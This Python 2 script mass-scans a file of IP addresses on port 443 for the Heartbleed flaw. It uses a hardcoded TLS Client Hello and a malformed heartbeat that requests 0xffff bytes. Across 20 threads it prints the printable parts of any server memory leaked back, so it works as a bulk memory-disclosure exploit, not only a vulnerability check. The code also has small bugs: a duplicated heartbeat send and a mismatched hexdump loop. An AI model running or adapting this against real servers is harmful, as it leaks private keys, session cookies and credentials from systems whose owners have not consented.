#!/usr/bin/env python

#ssl check page:http://www.zoomeye.org/lab/heartbleed/2015
#20150922 joeyxy83@gmail.com
#read the ip from file,then test ssl vulnerable


import requests
import json
import sys
import re
import argparse
import threadpool as tp
import struct
import socket
import time
import select
from Queue import Queue

queue = Queue()
global debug
debug = 0

class ssl_test(object):
    def __init__(self,file):
        self.file = file
        self.args = []



    def getip(self):
        file = open(self.file)
        for ip in file:
            if debug:print ip.strip()
            self.args.append(ip.strip())

    def start(self):
        pool = tp.ThreadPool(20)
        reqs = tp.makeRequests(ssl,self.args)
        [pool.putRequest(req) for req in reqs]
        pool.wait()
        

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 ff ff 
''')


timeout = 5

def hexdump(s):
    for b in xrange(0, len(s), 64):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        if debug:print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print '%s' % (pdat.replace('......', ''),)
        

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        if debug:print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        if debug:print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    if debug:print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay

def hit_hb(s,ip):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            if debug:print 'No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            if debug:print 'Received heartbeat response:'
            hexdump(pay)
            if len(pay) > 3:
                if debug:print 'WARNING: server returned more data than it should - server is vulnerable!,ip is:%s' % ip
                if debug:print 'ip:%s' % ip
                #print ip
            else:
                if debug:print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True

        if typ == 21:
            if debug:print 'Received alert:'
            hexdump(pay)
            if debug:print 'Server returned error, likely not vulnerable'
            return False

def ssl(ip):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if debug:print 'Connecting...'
    sys.stdout.flush()
    #ip = socket.getaddrinfo(args[0],None)[0][4][0]
    try:
        #s.connect((args[0], opts.port))
        #print 'the host is:%s' % ip
        s.settimeout(float(timeout))
        address=(str(ip),int(443))
        s.connect_ex((address))
        if debug:print 'Sending Client Hello...'
        sys.stdout.flush()
        s.send(hello)
        if debug:print 'Waiting for Server Hello...'
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                if debug:print 'Server closed connection without sending Server Hello.'
                return
            # Look for server hello done message.
            if typ == 22 and ord(pay[0]) == 0x0E:
                break

        if debug:print 'Sending heartbeat request...'
        sys.stdout.flush()
        s.send(hb)
        hit_hb(s,ip)
    except socket.error,e:
        if debug:print 'the error :%s' % e


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="get the ip list from file and test ssl")
    parser.add_argument('--file',action="store",dest="file",default="CN_443_ssl_vulnerable_ip.list")
    given_args = parser.parse_args()
    test=ssl_test(file=given_args.file)
    test.getip()
    test.start()
